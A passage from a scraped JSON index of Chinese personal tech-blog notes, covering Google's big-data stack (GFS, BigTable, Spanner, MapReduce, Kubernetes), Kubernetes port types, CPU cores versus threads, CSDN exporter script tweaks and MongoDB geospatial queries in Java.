写入数据时，是实时写入到物理块；而 HDFS 是积攒到一定量，才持久化到磁盘\n2.3.3 Colossus 初代 GFS 应用场景十分有限，系统延迟很高，使用时不得不做出各种优化，并且一旦 master 出现问题将会导致严重的后果。因此 2013 年 Google 提出的第二代 GFS——Colossus，新系统拥有分布式元数据管理、1MB 的数据块和理论上无限大的目录规模支持。Colossus 的架构如下：\nScalable Colossus metadata database：分布式元数据管理子系统，但也是整个新系统的核心。==对应原系统的 Master Server==。\nClient Library：应用程序或服务与 Colossus 交互的方式。\nColossus control plane：元数据服务，由许多的 curators 组成。\n“D” managed disk storage: 数据块存储服务器，==对应原系统的 Chunk Server==。\n2.4数据存储技术——分布式数据库 分布式文件系统适用于非结构化数据，且数据都以 key/value 的方式暴力存取。分布式数据库利用计算机网络将物理上分散的多个数据库单元连接起来组成的一个逻辑上统一的数据库。每个被连接起来的数据库单元称为站点或节点。分布式数据库有一个统一的数据库管理系统来进行管理，称为分布式数据库管理系统。\n2.4.1 BigTable BigTable 是 Google 于 2006 年公布的一个分布式结构化数据存储系统，它基于 GFS 构建，但是被设计用来处理海量数据：通常是分布在数千台普通服务器上的 PB 级的数据。\nBigtable 是一个稀疏的、分布式的、持久化存储的多维度排序 Map。即 BigTable 是一个持久化存储的包含海量 key-value 的 Map，这个 Map 按照 Key 进行排序，其中 Key 是一个由{Row Key, Column Key, Timestamp}组成的多维结构，每一行列的组成并不是严格的结构，最终 Map 通过多个分区来实现分布式。\nBigtable 是建立在其它的几个 Google 基础构件之上的。==BigTable 使用 Google 的分布式文件系统（GFS）存储日志文件和数据文件。==BigTable 集群通常运行在一个共享的机器池中，池中的机器还会运行其它的各种各样的分布式应用程序，BigTable 的进程通常要和其它应用的进程共享机器。BigTable 依赖集群管理系统来调度任务、管理共享机器上的资源，处理机器的故障以及监视机器的状态。==BigTable 内部存储数据的文件是 GoogleSSTable 格式的。SSTable 是一个持久化的、排序的、不可更改的 Map 结构。BigTable 还依赖一个高可用的、序列化的分布式锁服务组件，叫做 Chubby==。一个 Chubby 服务包括了 5 个活动的副本，其中的一个副本被选为 Master，并且处理请求。只有在大多数副本都是正常运行的，并且彼此之间能够互相通信的情况下，Chubby 服 务才是可用的。当有副本失效的时候，Chubby 使用 ==Paxos 算法==来保证副本的一致性。\n由上图可知，BigTable 包括了三部分：一个 Master Node、多个 Tablet Server 和 GFS 的支持。Master Node 主要负责以下工作：建立表、为 Tablet Server 分配 Tablets、检测新加入的或者过期失效的 Tablet 服务器、对 Tablet 服务器进行负载均衡、以及对保存在 GFS 上的文件进行垃圾收集。每个 Tablet Server 都管理一个 Tablet 的集合（通常每个服务器有大约数十个至上千个 Tablet）。每个 Tablet 服务器负责处理它所加载的 Tablet 的读写操作，以及在 Tablets 过大时，对其进行分割。一个 BigTable 集群存储了很多表，每个表包含了一个 Tablet 的集合，而每个 Tablet 包含了某个范围内的行的所有相关数据。初始状态 下，一个表只有一个 Tablet。随着表中数据的增长，它被自动分割成多个 Tablet，缺省情况下，每个 Tablet 的尺寸大约是 100MB 到 200MB。\n2.4.2 HBase HBase 是 Hadoop 项目于 2007 年对 BigTable 的开源实现，主要用来存储非结构化和半结构化的松散数据。HBase 非常接近 BigTable，采用了一样的数据模型，将协同服务管理从 ==Chubby 替换成了开源的 Zookeeper，将分布式文件存储系统 GFS 替换成了开源的 HDFS==。\n如上图所示，HBase 架构主要有：客户端、Zookeeper 服务器、Master 服务器、Region 服务器。客户端包含访问 HBase 的接口，同时在缓存中维护着已经访问过的 Region 位置信息，用来加快后续数据访问过程。==Zookeeper 是一个很好的集群管理工具，它可以帮助选举出一个 Master 作为集群的总管，并保证在任何时刻总有唯一一个 Master 在运行，这就避了 Master 的“单点失效”问题==。Master主要负责表和 Region 的管理工作，主要工作有：管理用户对表的增加、删除、修改、查询等操作、实现不同 Region 服务器之间的负载均衡、在 Region 分裂或合并后，负责重新调整 Region 的分布、对发生故障失效的 Region 服务器上的Region 进行迁移等。Region 服务器是 HBase 中最核心的模块，负责维护分配给自己的 Region，并响应用户的读写请求。\n2.4.3 Spanner Spanner 是 Google 于 2012 年公布的全球级分布式数据库，它==冲破了 CAP 原理的枷锁，在可扩展性、可用性、一致性三者之间达到了完美平衡==。Spanner 可以扩展到数百万台机器，数已百计的数据中心，上万亿的行，除了夸张的扩展性之外，它通过同步复制和多版本来满足一致性和可用性。BigTable 精简的数据模型支持用户动态的控制数据的分布和格式，但是对一些复杂的模型而言，很难维护其数据一致性。因此，Spanner 从一个类似 BigTable 的版本化键值存储（versioned key-value store）演进成了一个==多版本时态数据库（temporal multi-version database）==。数据被存储在模型化的半关系型表中；数据被版本化，且每个版本自动按照提交时间标记时间戳；旧版本遵循可配置的垃圾回收策略；应用程序可以读取时间戳较老的数据。Spanner 支持通用的事务，且提供了基于 SQL 的查询语言。\n图 2-13 描述了 Sppanner universe 中的服务器。一个 zone 有一个 zonemaster和几百到几千个 spanserver。前者为 spannerserver 分配数据，后者向客户端提供数据服务。客户端使用每个 zone 的 location proxy 来定位给它分配的为其提供数据服务的 spanserver。universe master 和 placement driver 目前是单例。universe master 主要是一个控制台，其显示了所有 zone 的状态信息，以用来交互式调试。placement driver 分钟级地处理 zone 间的自动化迁移。placement driver 定期与 spanserver 交互来查找需要移动的数据，以满足更新后的副本约束或进行负载均衡。在最底层，每个 spanserver 负责 100 到 1000 个被称为 tablet 的数据结构实例。每个 tablet 都类似于 Bigtable 的 tablet 抽象，其实现了一系列如下的映射：(𝑘𝑒𝑦: 𝑠𝑡𝑟𝑖𝑛𝑔,𝑡𝑖𝑚𝑒𝑠𝑡𝑎𝑚𝑝: 𝑖𝑛𝑡64) → 𝑠𝑡𝑟𝑖𝑛𝑔 。\n==Spannner 为数据分配时间戳，这是 Spanner 更像多版本数据库而不是键值存储的重要原因之一。==\n2.5大数据分析及实时计算技术 2.5.1 MapReduce MapReduce 是 Google 于 2004 年提出的一个处理和生成超大数据集的编程模型，它将海量数据处理的过程拆分为 ==map 和 reduce==。==用户首先创建一个 Map 函数处理一个基于 key/value pair 的数据集合，输出中间的基于 key/value pair 的数据集合；然后再创建一个 Reduce 函数用来合并所有的具有相同中间 key 值的中间 value 值。==基于 MapReduce 的程序能够在大量的普通配置的计算机上实现并行化处理。Map Reduce 在运行时只关心：如何分割输入数据、在大量计算机组成的 集群间的调度、集群中计算机的错误处理、管理集群中计算机之间必要的通信。没有并行计算和分布式处理系统开发经验的程序员可以通过 MapReduce 有效利用分布式系统的丰富资源。\nMapReduce 编程模型在 Google 内部成功应用于多个领域。MapReduce 的优势主要是：==封装了并行处 理、容错处理、数据本地化优化、负载均衡等等技术难点的细节、大量异构数据的解决、实现了一个在数千台计算机组成的大型集群上灵活部署运行的 MapReduce。==\n2.5.2 Spark Spark 是于 2010 年提出的基于内存计算的通用大规模数据处理框架。虽然MapReduce 提供了对数据访问和计算的抽象，但是==对于数据的复用就是简单的将中间数据写到一个稳定的文件系统中，会产生数据的复制备份，磁盘的 I/O 以及数据的序列化，所以在遇到需要在多个计算之间复用中间结果的操作时效率就会非常的低。==后来提出了一个新的模型 RDD，RDD 是一个可以容错且并行的数据结构(其实可以理解成分布式的集合，操作起来和操作本地集合一样简单)，==它可以让用户显式的将中间结果数据集保存在内存中==，并且通过控制数据集的分区来达到数据存放处理最优化。Spark 借鉴了 MapReduce 思想发展而来，保留了其分布式并行计算的优点并改进了其明显的缺陷。==让中间数据存储在内存中提高了运行速度、并提供丰富的操作数据的 API 提高了开发速度==。\nRDD（Resilient Distributed Dataset）叫做弹性分布式数据集，是 Spark 中最基本的数据抽象，它代表一个不可变、可分区、里面的元素可并行计算的集合。RDD 具有数据流模型的特点：自动容错、位置感知性调度和可伸缩性。RDD 允 许用户在执行多个查询时显式地将工作集缓存在内存中，后续的查询能够重用工作集，这极大地提升了查询速度。\n2.6 编排、管理、调度技术 大数据计算都是典型的分布式计算模型，是基于有向无环图（directed acyclic graph，DAG）或者大规模并行处理（massive parallel programming， MPP）迭代的计算模式，这意味着计算任务都是运行时才能生成的，因而难以进行预先调度，而分布式的特点又要求调度系统有更高的灵活性和自适应性。因此为了分布式存储能够高效稳定地运行数万个容器，就需要非常强大的服务编排系统。\n2.6.1 Borg Borg 是 Google 于 2015 年提出的一个集群管理系统，上面运行着十万级的任务，数千个不同的应用，管理着数万台机器。==其通过权限管理、资源共享、性能隔离等来达到高资源利用率。==它能够支持高可用应用，并通过调度策略减少出现故障的概率，提供了任务描述语言、实时任务监控、分析工具等。Borg 主要三大优势：向用户隐藏资源管理和故障处理的细节，用户只需专注于应用程序开发；高可靠性和高可用性的操作，同时支持应用程序相关特性；有效的在数以万计的机器上运行工作负载。\n2.6.2 Kubernetes Kubernetes 是 Google 开源用来管理 Docker 集群的项目，继承了 Borg 的优点，实现了编排、部署、运行以及管理容器应用的目的. Kubernetes 提供资源池化管理，可以将整个集群内的中央处理器（center processing unit，CPU）、图形处理器（graphic processing unit，GPU）、内存、网络和硬盘等资源抽象为一个资源池，可以根据应用的资源需求、资源池中的实时资源情况进行灵活调度；Kubernetes 包含一个统一的调度框架，最多可以管理数千个服务器和数万个容器，同时提供插件化的接口，让第三方来定制和扩展新的调度系统；此外 Kubernetes支持通过 ConfigMap 等方式动态地调整应用配置，从而具备动态调配的基础能力。\n技术层分析 GEE 在技术总体上属于==封闭框架 Close Architecture==，底层严格依赖于 Google云服务，几乎没有办法与其他技术方案相融合。虽然 GEE 近期推出了商业化应用的方案，但仍然需要依托于 Google 云服务的基础框架。如果一个现有应用已经通过微软或者亚马逊的云服务框架开展了数据的云存储和管理，想利用 GEE来集成开展上层应用，目前是没有办法做到的。\nGEE 在表面上属于轻应用、免费的平台，但其后台过于庞大（当然，也是其优势之所在）。在后台与前台之间，并没有明确的业务中台，因而也难以在 GEE平台上扩展新的应用。\n相比而言，我们应当采用==开放架构 Open Architecture==，既支持普通用户的轻便使用，还要支持广大开发者的集成应用，需要与业务开发中广泛采用的技术框架（如Leaflet、Cesium 等前端框架，Hadoop、Spark 等后端框架，Kubernetes、Zookeeper等分布式框架）相集成，具有较高的解耦性和兼容性。\n","permalink":"https://chance7bin.github.io/posts/note/google-earth-engine%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/","summary":"1.GEE的产品形态和序列 1.1 GEE基本产品形态 已有的 GIS 云服务通常分为基础云服务（IaaS, Infrastructure as a Service）和 软件云服务（SaaS, Software as","title":"Google Earth Engine调研报告"},{"content":"pod containerPort containerPort是在pod控制器中定义的，pod中的容器需要暴露的端口，需要暴露什么端口取决于镜像构建时该服务所暴露的端口\n例如，mysql 服务需要暴露 3306 端口，redis 暴露 6379 端口\n如下是一个nginx的deployment.yaml配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 apiVersion: apps/v1 kind: Deployment metadata: name: pc-deployment namespace: dev spec: strategy: # 策略 type: Recreate # 重建更新 replicas: 1 selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80\t# 此处定义暴露的端口 启动nginx，通过生成的ip:containerPort进行访问\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [root@clustermaster test]# kubectl apply -f deployment.yaml deployment.apps/pc-deployment created [root@clustermaster test]# kubectl get deploy -n dev NAME READY UP-TO-DATE AVAILABLE AGE pc-deployment 1/1 1 1 14s [root@clustermaster test]# kubectl get pod -n dev NAME READY STATUS RESTARTS AGE pc-deployment-5d89bdfbf9-qnmc8 1/1 Running 0 31s [root@clustermaster test]# kubectl get pod -n dev -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pc-deployment-5d89bdfbf9-qnmc8 1/1 Running 0 39s 10.244.1.47 clusternode1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; [root@clustermaster test]# curl 10.244.1.47 ... \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; ... service 如下是一个service.yaml配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: v1 kind: Service metadata: name: service-nodeport namespace: dev spec: selector: app: nginx-pod type: NodePort # service类型 ports: - port: 8081 # 服务访问端口，集群内部访问的端口 nodePort: 30002 # NodePort，外部客户端访问的端口 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配 targetPort: 80 # pod控制器中定义的端口（应用访问的端口） port port是暴露在cluster ip上的端口，port提供了集群内部客户端访问service的入口，即 CLUSTER-IP:port\n可以看到，通过CLUSTER-IP访问80端口是访问不到的，必须是service中配置的port端口才可以\n1 2 3 4 5 6 7 8 9 [root@clustermaster test]# kubectl get service -n dev -o wide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service-nodeport NodePort 10.102.217.51 \u0026lt;none\u0026gt; 8081:30002/TCP 13s app=nginx-pod [root@clustermaster test]# curl 10.102.217.51 curl: (7) Failed connect to 10.102.217.51:80; 拒绝连接 [root@clustermaster test]# curl 10.102.217.51:8081 ... \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; ... targetPort targetPort是pod上的端口，从port/nodePort上来的数据，经过kube-proxy流入到后端pod的targetPort上，最后进入容器。\n与制作容器时暴露的端口一致（使用DockerFile中的EXPOSE），例如官方的nginx（参考DockerFile）暴露80端口。\nnodePort nodePort 提供了集群外部客户端访问 Service 的一种方式，nodePort 提供了集群外部客户端访问 Service 的端口，通过 nodeIP:nodePort 提供了外部流量访问k8s集群中service的入口。\n比如外部用户要访问k8s集群中的一个Web应用，那么我们可以配置对应service的type=NodePort，nodePort=30002。其他用户就可以通过浏览器http://nodeIP:30002访问到该web服务（nodeIP为集群中的任意一个ip即可）。\n例如访问 http://172.21.212.151:30002/即可访问到nginx\n","permalink":"https://chance7bin.github.io/posts/note/k8s%E4%B8%AD%E5%90%84%E7%A7%8Dport%E7%9A%84%E5%8C%BA%E5%88%AB/","summary":"pod containerPort containerPort是在pod控制器中定义的，pod中的容器需要暴露的端口，需要暴露什么端口取决于镜像构建时该服务所暴露的端口 例如","title":"k8s中各种port的区别"},{"content":"\rName：表示物理CPU数\nNumberOfCores：表示CPU核心数\nNumberOfLogicalProcessors：表示CPU线程数\n注释：VM虚拟机中的CPU选择的核心数实际是代表线程数。\nCPU CPU是指看得见的 芯片个数、也就是指主板上插CPU的插槽个数\n核数 cpu cores 在每一个cpu上面,都可能有多个核(core)，每一个核中都有独立的 一套ALU、FPU、Cache 组件。所以这个概念也被称之为物理核。总的CPU物理内核数=物理CPU数*每颗CPU的内核数\n线程数 processor 这个主要得益于现在的超线程技术，可以让一个物理核模拟处多个逻辑核，processor。起作用也就是当我们有多个计算任务、或者处理逻辑的时候，可以让一个计算任务使用ALU的时候，另一个则取使用FPU。这样可以充分利用物理核的各个组件。使得同一个物理核当中也可以执行多个计算任务。\n总的逻辑CPU数=物理CPU个数*每颗物理CPU的核数*超线程数\n总的逻辑CPU数=总的CPU物理内核数*超线程数\n几核几线程 我们常说的核指的是内核个数。像上面这张图表示6核12线程。基于上面的逻辑核公式可以推算出每个内核可以运行2个线程数量。\n在任务管理器中，看到其实是6个内核，但是逻辑处理器是12个，有多少个逻辑处理器，就可以开多少个线程。 线程数=逻辑处理器个数\n一个物理CPU可以有1个或者多个物理内核， 一个物理内核可以作为1个或者2个逻辑CPU。 操作系统可以使用逻辑CPU来模拟真实CPU。 在没有多核处理器的时候，一个物理CPU只能有一个物理内核， 有了多核技术，一个物理CPU可以有多个物理内核，可以把一个CPU当作多个CPU使用，即逻辑CPU。 没有开启超线程时，逻辑CPU的个数就是总的CPU物理内核数。 开启超线程后，逻辑CPU的个数就是总的CPU物理内核数的两倍。\n逻辑处理器 逻辑处理器指的就是支持超线程技术的处理器在一个单核心的CPU内，利用其中空闲的执行单元，模拟出另外一个核心，使整个CPU有两个逻辑核心，从而提高整个CPU的工作效率。\n注意：因为逻辑处理器是通过在一枚处理器上整合两个逻辑处理器单元，使得具有这种技术的新型CPU，有能同时执行多个线程的能力，这就是我们所说的超线程 。\n单核多CPU与多核单CPU 一台计算机的处理器部分的架构\n单核多CPU，那么每一个CPU都需要有较为独立的电路支持，有自己的Cache，而他们之间通过板上的总线进行通信。（一致性问题）\n假如在这样的架构上，我们要跑一个多线程的程序（常见典型情况），不考虑超线程，那么每一个线程就要跑在一个独立的CPU上，线程间的所有协作都要走总线，而共享的数据更是有可能要在好几个Cache里同时存在。这样的话，总线开销相比较而言是很大的，怎么办？那么多Cache，即使我们不心疼存储能力的浪费，一致性怎么保证？\n多核单CPU，那么我们只需要一套芯片组，一套存储，多核之间通过芯片内部总线进行通信，共享使用内存。在这样的架构上，如果我们跑一个多线程的程序，那么线程间通信将比上一种情形更快。\n多个CPU常见于分布式系统，用于普通消费级市场的不多，多用于cluster，云计算平台什么的。多CPU架构最大的瓶颈就是I/O，尤其是各个CPU之间的通讯，低成本的都用100M以太网做，稍微好一点的用1000M以太网，再好的就用光纤等等，但无论如何速度和通量都比不上主板的主线。所以多CPU适用于大计算量，对速度（时间）不（太）敏感的任务，比如一些工程建模，或者像SATI找外星人这种极端的，跑上几千年都不着急的。而且多CPU架构更简单清晰，可以用消费级产品简单做数量堆叠，成本上有优势。而多核单CPU则适合对通讯I/O速度要求较快的应用，（相同核数量下）成本上也高一些，好像只有在超级计算机里会用到以万为单位的核心数，普通消费级产品也就是到16核封顶了，因为成本控制的原因。\n实现16个逻辑CPU的原理图 线程/进程/多核CPU 1 2 3 \u0026gt;\u0026gt;\u0026gt; from multiprocessing import cpu_count \u0026gt;\u0026gt;\u0026gt; print(cpu_count()) 12 在python中，使用上述代码可以获取当前系统的逻辑cpu个数，也就是支持并发的线程个数。\n这里再区分一下进程，线程，多个CPU和单个多核CPU，多个多核CPU，这些概念区别。\n左图：多个物理CPU，CPU通过总线进行通信，效率比较低。\n右图：多核CPU，不同的核通过L2 cache进行通信，存储和外设通过总线与CPU通信\n进程是程序的一次执行过程，是一个动态概念，是程序在执行过程中分配和管理资源的基本单位，\n线程是CPU调度和分派的基本单位，它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\n**联系：**线程是进程的一部分，一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程；\n根本区别：进程是操作系统资源分配的基本单位，而线程是任务调度和执行的基本单位\n参考：\n内核/逻辑处理器/线程/多线程/多CPU/多核CPU\nCPU个数、CPU核心数、CPU线程数 CPU、核数、线程数扫盲\n","permalink":"https://chance7bin.github.io/posts/note/cpu%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B/","summary":"Name：表示物理CPU数 NumberOfCores：表示CPU核心数 NumberOfLogicalProcessors：表示CPU线程数 注","title":"CPU、内核、线程"},{"content":"CSDNExporter-master 该笔记记录CSDNExporter-master的配置，以及一些代码的修改\n安装必要的 Python 库, 如 httpx, requests, BeautifulSoup; 为了解析图片链接, 需要安装 aria2, 并保证能在命令行启动; 为了转换为 PDF, 需要安装 Pandoc 代码中的方法注释 argparse argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。argparse模块的作用是用于解析命令行参数。\n我们很多时候，需要用到解析命令行参数的程序，目的是在终端窗口(ubuntu是终端窗口，windows是命令行窗口)输入训练的参数和选项。\n1 2 3 4 5 我们常常可以把argparse的使用简化成下面四个步骤 1：import argparse 2：parser = argparse.ArgumentParser() 3：parser.add_argument() 4：parser.parse_args() parser.add_argument parser.add_argument('--with_title', action='store_true')\n关于parser.add_argument()记录一个特殊的情况：action\n栗子1：self.parser.add_argument('--lr_use', action='store_true', default=False, help='if or not use lr_loss')\n当在终端运行的时候，如果不加入--lr_use, 那么程序running的时候，lr_use的值为default: False\n如果加上了--lr_use,不需要指定True/False,那么程序running的时候，lr_use的值为True\n栗子2: self.parser.add_argument('--no_flip', action='store_false', help='.....')\n当在终端运行的时候，并没有加入--no_flip, 数据集中的图片并不会翻转，打印出来看到no_flip的值为True\nNote：有default值的时候，running时不声明就为默认值，\n没有的话，如果是store_false,则默认值是True，如果是store_true,则默认值是False\n实在记不住搞混的话，可以每次在run之前print出来看一下值是true还是false，这样比较保险\nsoup = BeautifulSoup() soup = BeautifulSoup(response.content, 'html.parser', from_encoding=\u0026quot;utf-8\u0026quot;)\nPython中BeautifulSoup库的用法\n代码中需要修改的地方 1.global language utils.py文件中的recursive方法最前面加一个global language，\n防止出现 UnboundLocalError: local variable \u0026rsquo;language\u0026rsquo; referenced before assignment 的异常\n​\n2.增加代码高亮的解析 1 2 3 elif tag in [\u0026#39;mark\u0026#39;]: soup.contents.insert(0, NavigableString(\u0026#39;==\u0026#39;)) soup.contents.append(NavigableString(\u0026#39;==\u0026#39;)) 3.增加引用的解析 修改elif tag == 'p':分支中的代码\n1 2 3 4 5 6 7 8 elif tag == \u0026#39;p\u0026#39;: if soup.parent.name == \u0026#39;blockquote\u0026#39;: for content in soup.contents: if isinstance(content, NavigableString): content.string = \u0026#39;\u0026gt;\u0026#39; + content.string.strip() + \u0026#39;\\n\u0026#39; elif soup.parent.name != \u0026#39;li\u0026#39;: # print(soup.parent) soup.contents.insert(0, NavigableString(\u0026#39;\\n\u0026#39;)) 4.完善列表解析 1 2 3 elif tag in [\u0026#39;li\u0026#39;]: soup.contents.insert(0, NavigableString(\u0026#39;+ \u0026#39;)) soup.contents.append(NavigableString(\u0026#39;\\n\u0026#39;)) 5.博客标题特殊符号出错 若博客标题名为Linux C/C++，那么文件输出时会出错，因为会把该标题当成 Linux C/C++路径，导致找不到该文件夹\n需在执行html2md前对title进行处理\n1 2 title = \u0026#39;_\u0026#39;.join(title.replace(\u0026#39;*\u0026#39;, \u0026#39;\u0026#39;).strip().split()) title = title.replace(\u0026#39;/\u0026#39;, \u0026#39;_\u0026#39;) 6.图片的保存路径 每个xxx.md的图片都保存到xxx.assets中\n1.首先在Parser类中将fig_dir设置成外部传参的形式\n2.修改recursive方法中elif tag == 'img': 分支下的代码\n1 2 3 md_img_txt_arr = img_file.split(\u0026#39;/\u0026#39;) md_img_txt = \u0026#34;/\u0026#34;.join(md_img_txt_arr[1:len(md_img_txt_arr)]) code = \u0026#39;![{}]({})\u0026#39;.format(md_img_txt, md_img_txt) 3.在html2md方法中新增一个参数fig_dir，并在初始化Parser类的时候将其传入\n4.在调用html2md前设置fig_dir的路径\n1 fig_dir = join(md_dir, title + \u0026#39;.assets\u0026#39;) ","permalink":"https://chance7bin.github.io/posts/note/csdn%E5%AF%BC%E5%87%BA%E4%B8%BAmd%E6%96%87%E4%BB%B6/","summary":"CSDNExporter-master 该笔记记录CSDNExporter-master的配置，以及一些代码的修改 安装必要的 Python 库, 如 httpx, requests, BeautifulSoup; 为了解析图片链接, 需要安装 aria2, 并保证能在命","title":"csdn导出为md文件"},{"content":"引言 https://mongodb.net.cn/manual/geospatial-queries/\n空间查询——查Point元素 查询字段的类型 1 2 // @GeoSpatialIndexed(type = GeoSpatialIndexType.GEO_2DSPHERE) GeoJsonPoint center; // 图像中心点 构造box参数 box格式 [左下，然后右上]\n1 Box box = new Box(new Point(-38, -42), new Point(162, 63)); Point注意导入的是geo下的\n使用mongoRepository方式查询 1 2 3 public interface MapItemDao extends MongoRepository\u0026lt;MapItem, String\u0026gt;{ Page\u0026lt;MapItem\u0026gt; findByCenterWithin(Box box, Pageable pageable); } 使用mongoTemplate方式查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** * 矩形查询 * box格式 [左下，然后右上] * \u0026lt;code\u0026gt;Box box = new Box(new Point(-38, -42), new Point(162, 63));\u0026lt;/code\u0026gt; * @param box * @return java.util.List\u0026lt;com.example.maparchivebackend.entity.po.MapItem\u0026gt; * @Author bin **/ public List\u0026lt;MapItem\u0026gt; findInPolygon(Box box) { Query query = new Query(); query.addCriteria(Criteria.where(\u0026#34;center\u0026#34;).within(box)); return mongoTemplate.find(query, MapItem.class, \u0026#34;mapItem\u0026#34;); } 使用BasicDBObject方式查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 public List\u0026lt;DBObject\u0026gt; withinBox(Point bottomLeft, Point upperRight, BasicDBObject query, FindDTO findDTO) { if (query == null) query = new BasicDBObject(); LinkedList\u0026lt;double[]\u0026gt; box = new LinkedList\u0026lt;\u0026gt;(); box.add(new double[]{bottomLeft.getLng(), bottomLeft.getLat()}); box.add(new double[]{upperRight.getLng(), upperRight.getLat()}); query.put(\u0026#34;center\u0026#34;, new BasicDBObject(\u0026#34;$geoWithin\u0026#34;, new BasicDBObject(\u0026#34;$box\u0026#34;, box))); // 查询的时候从第几个开始查 int skipIndex = (findDTO.getPage() - 1) * findDTO.getPageSize(); // 排序顺序 Bson sort = findDTO.getAsc() ? Sorts.ascending(findDTO.getSortField()) : Sorts.descending(findDTO.getSortField()); FindIterable\u0026lt;Document\u0026gt; mapItemList = mongoTemplate.getCollection(\u0026#34;mapItem\u0026#34;) .find(query) .sort(Sorts.orderBy(sort)) .skip(skipIndex) .limit(findDTO.getPageSize()); for (Document document : mapItemList) { System.out.println(document); } // try { // while (cursor.hasNext()) { // //查询出的结果转换成jsonObject // System.out.println(cursor.next()); // JSONObject jsonObject = JSONObject.parseObject( cursor.next().toJson()); // System.out.println(); // } // } catch (Exception e) { // e.printStackTrace(); // } finally { // cursor.close(); // } return null; } 空间查询——查Polygon元素 $geoWithin\n官网：The specified shape can be either a GeoJSON Polygon\n查询字段的类型 1 2 // @GeoSpatialIndexed(type = GeoSpatialIndexType.GEO_2DSPHERE) GeoJsonPolygon box; // 图像box范围 构造框选参数 （不能用box了，查不出来，必须用Polygon/GeoJsonPolygon）\n1 2 3 4 5 6 7 8 9 10 11 12 double left_bottom_lon = 24.482901; double left_bottom_lat = -38.771001; double right_upper_lon = 150.443456; double right_upper_lat = 58.526297; GeoJsonPolygon polygon = new GeoJsonPolygon( new Point(left_bottom_lon, left_bottom_lat), new Point(left_bottom_lon, right_upper_lat), new Point(right_upper_lon, right_upper_lat), new Point(right_upper_lon, left_bottom_lat), new Point(left_bottom_lon, left_bottom_lat) ); 选择框属性的类型必须是GeonPolygon\n使用mongoRepository方式查询 1 2 Page\u0026lt;T\u0026gt; findByNameContainsIgnoreCaseAndPolygonWithinAndClassifications( String name, GeoJsonPolygon polygon, List\u0026lt;String\u0026gt; classifications, Pageable pageable); 使用mongoTemplate方式查询 1 2 3 4 5 6 7 8 public List\u0026lt;MapItem\u0026gt; findInPolygon(Polygon polygon, List\u0026lt;String\u0026gt; classifications){ Query query = new Query(); // query.addCriteria(Criteria.where(\u0026#34;box\u0026#34;).within(polygon)); query.addCriteria(Criteria.where(\u0026#34;polygon\u0026#34;).intersects(polygon)); query.addCriteria(Criteria.where(\u0026#34;classifications\u0026#34;).in(classifications)); return mongoTemplate.find(query, MapItem.class, \u0026#34;basicScaleMap\u0026#34;); } 注意：mongoRepository只支持within的查询，要使用intersects的查询必须使用mongoTemplate，同时使用intersects查询时查询框必须是GeoJsonPolygon类\n遇到的问题 空间查询点要素，范围框选太大查不出来 （已解决） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { \u0026#34;findDTO\u0026#34;: { \u0026#34;asc\u0026#34;: false, \u0026#34;page\u0026#34;: 1, \u0026#34;pageSize\u0026#34;: 4, \u0026#34;sortField\u0026#34;: \u0026#34;createTime\u0026#34; }, \u0026#34;pointList\u0026#34;: [ [ -38, -42 ], [ 162, -42 ], [ 162, 63 ], [ -38, 63 ], [ -38, -42 ] ] } 使用上面的测试数据， 运行下面的代码返回的结果为空\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public JsonResult findByPolygon(SpatialDTO spatialDTO) { List\u0026lt;List\u0026lt;Double\u0026gt;\u0026gt; pointList = spatialDTO.getPointList(); FindDTO findDTO = spatialDTO.getFindDTO(); List\u0026lt;Point\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 5; i++) { List\u0026lt;Double\u0026gt; p = pointList.get(i); Point point = new Point(p.get(0),p.get(1)); list.add(point); } GeoJsonPolygon geoJsonPolygon = new GeoJsonPolygon(list); Pageable pageable = genericService.getPageable(findDTO); Page\u0026lt;MapItem\u0026gt; items = mapItemDao.findAllByCenterWithin(geoJsonPolygon, pageable); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;count\u0026#34;, items.getTotalElements()); jsonObject.put(\u0026#34;content\u0026#34;, items.getContent()); return ResultUtils.success(jsonObject); } 下面这个查得出来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { \u0026#34;findDTO\u0026#34;: { \u0026#34;asc\u0026#34;: false, \u0026#34;page\u0026#34;: 1, \u0026#34;pageSize\u0026#34;: 4, \u0026#34;sortField\u0026#34;: \u0026#34;createTime\u0026#34; }, \u0026#34;pointList\u0026#34;: [ [ -38, -42 ], [ 137, -42 ], [ 137, 63 ], [ -38, 63 ], [ -38, -42 ] ] } 做了下测试，发现Within对Polygon类的支持比较好，虽然GeoJsonPolygon继承Polygon类，但是当范围很大的时候就是查不出来\n还有一点要注意的是，在mongodb中空间查询使用的是$geoWithin ， 但是为什么在mongorepository中用的是within呢？\nmongoRepository使用within == 在mongodb中使用$geoWithin\n参考官方文档\n空间查询polygon，范围框选查不到所有包含在内的数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { \u0026#34;findDTO\u0026#34;: { \u0026#34;asc\u0026#34;: false, 